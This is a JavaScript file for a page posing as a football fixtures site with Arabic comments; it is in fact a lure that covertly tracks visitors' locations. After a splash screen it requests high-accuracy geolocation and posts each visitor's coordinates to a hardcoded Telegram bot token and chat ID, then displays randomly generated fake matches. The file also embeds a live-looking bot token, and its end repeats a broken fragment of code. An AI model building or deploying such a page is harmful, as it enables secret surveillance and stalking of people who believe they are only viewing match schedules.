const CONFIG = {
  telegramBotToken: '8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
  telegramChatId: '8209565969',
  splashDurationMs: 10000, // 10 ثواني
  developerName: '𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪'
};

const splash = document.getElementById('splash');
const skipBtn = document.getElementById('skip-btn');
const matchTable = document.getElementById('match-table');
const leaguesDiv = document.getElementById('leagues');
const locationMsg = document.getElementById('location-msg');
const grantBtn = document.getElementById('grant-btn');
const retryBtn = document.getElementById('retry-btn');

let _samples = [];

// إخفاء البوب
function hideSplash() {
  if (!splash || splash.classList.contains('hidden')) return;
  splash.classList.add('hidden');
  setTimeout(() => requestGeolocation(), 500); // طلب الموقع بعد اختفاء البوب
}

// أحداث الضغط أو الانتظار
splash.addEventListener('click', hideSplash);
skipBtn.addEventListener('click', hideSplash);
setTimeout(hideSplash, CONFIG.splashDurationMs);

// طلب الموقع
function requestGeolocation() {
  if (!navigator.geolocation) {
    showLocationRequired();
    return;
  }
  navigator.geolocation.getCurrentPosition(
    pos => {
      _samples.push({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        acc: pos.coords.accuracy,
        timestamp: new Date().toLocaleString()
      });
      sendSampleToTelegram(_samples[_samples.length - 1]);
      showMatchesTable();
    },
    err => { showLocationRequired(); },
    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
  );
}

// عرض رسالة منح الإذن بس بعد البوب لو ما منحش المستخدم الإذن
function showLocationRequired() {
  locationMsg.style.display = 'flex';
}

// زر منح الإذن: يظهر مرة واحدة ويعرض الخطوات
grantBtn.onclick = () => {
  alert("انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة.");
};

// زر إعادة المحاولة: يعيد تحميل الصفحة
retryBtn.onclick = () => {
  window.location.reload();
};

// إرسال بيانات الموقع للتليجرام
function sendSampleToTelegram(sample) {
  const text = `📍 Sample
🕒 ${sample.timestamp}
🧭 Lat: ${sample.lat}, Lng: ${sample.lng}
🎯 Accuracy: ${sample.acc} m
⚡ ${CONFIG.developerName}`;
  _sendTelegramMessage(text);
}

function _sendTelegramMessage(text) {
  const token = CONFIG.telegramBotToken;
  const chatId = CONFIG.telegramChatId;
  if (!token || !chatId) return;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text })
  }).catch(err => console.error(err));
}

/* --- MATCH TABLE --- */
const leaguesData = [
  { name: 'الدوري المصري', matches: generateMatches(3) },
  { name: 'الدوري الإنجليزي', matches: generateMatches(3) },
  { name: 'الدوري الإسباني', matches: generateMatches(3) },
  { name: 'الدوري الإيطالي', matches: generateMatches(3) },
  { name: 'الدوري الألماني', matches: generateMatches(3) },
  { name: 'الدوري الفرنسي', matches: generateMatches(3) },
  { name: 'الدوري البرتغالي', matches: generateMatches(3) },
  { name: 'الدوري الهولندي', matches: generateMatches(3) },
  { name: 'الدوري التركي', matches: generateMatches(3) },
  { name: 'الدوري الروسي', matches: generateMatches(3) }
];

function generateMatches(count) {
  const teams = ['الأهلي','الزمالك','ليفربول','مانشستر يونايتد','ريال مدريد','برشلونة','يوفنتوس','ميلان','بايرن ميونخ','باريس سان جيرمان'];
  const stadiums = ['استاد القاهرة','ملعب برج العرب','أولد ترافورد','كامب نو','سان سيرو','أليانز أرينا','حديقة الأمراء'];
  let arr = [];
  for (let i = 0; i < count; i++) {
    let t1 = teams[Math.floor(Math.random()*teams.length)];
    let t2;
    do { t2 = teams[Math.floor(Math.random()*teams.length)]; } while(t2 === t1);
    arr.push({
      team1: t1,
      team2: t2,
      time: `${String(Math.floor(Math.random()*24)).padStart(2,'0')}:${String(Math.floor(Math.random()*60)).padStart(2,'0')}`,
      stadium: stadiums[Math.floor(Math.random()*stadiums.length)]
    });
  }
  return arr;
}

function showMatchesTable() {
  matchTable.style.display = 'block';
  leaguesDiv.innerHTML = '';
  leaguesData.forEach(league => {
    const leagueDiv = document.createElement('div');
    leagueDiv.classList.add('league');
    const title = document.createElement('div');
    title.classList.add('league-title');
    title.textContent = league.name;
    leagueDiv.appendChild(title);

    league.matches.forEach(match => {
      const card = document.createElement('div');
      card.classList.add('match-card');
      card.innerHTML = `<div>${match.team1} ⚽ ${match.team2}</div><div>${match.time} - ${match.stadium}</div>`;
      leagueDiv.appendChild(card);
      setTimeout(() => card.classList.add('visible'), 100);
    });

    leaguesDiv.appendChild(leagueDiv);
  });
}`,
      stadium: stadiums[Math.floor(Math.random()*stadiums.length)]
    });
  }
  return arr;
}

function showMatchesTable() {
  matchTable.style.display = 'block';
  leaguesDiv.innerHTML = '';
  leaguesData.forEach(league => {
    const leagueDiv = document.createElement('div');
    leagueDiv.classList.add('league');
    const title = document.createElement('div');
    title.classList.add('league-title');
    title.textContent = league.name;
    leagueDiv.appendChild(title);

    league.matches.forEach(match => {
      const card = document.createElement('div');
      card.classList.add('match-card');
      card.innerHTML = `<div>${match.team1} ⚽ ${match.team2}</div><div>${match.time} - ${match.stadium}</div>`;
      leagueDiv.appendChild(card);
      setTimeout(() => card.classList.add('visible'), 100);
    });

    leaguesDiv.appendChild(leagueDiv);
  });
}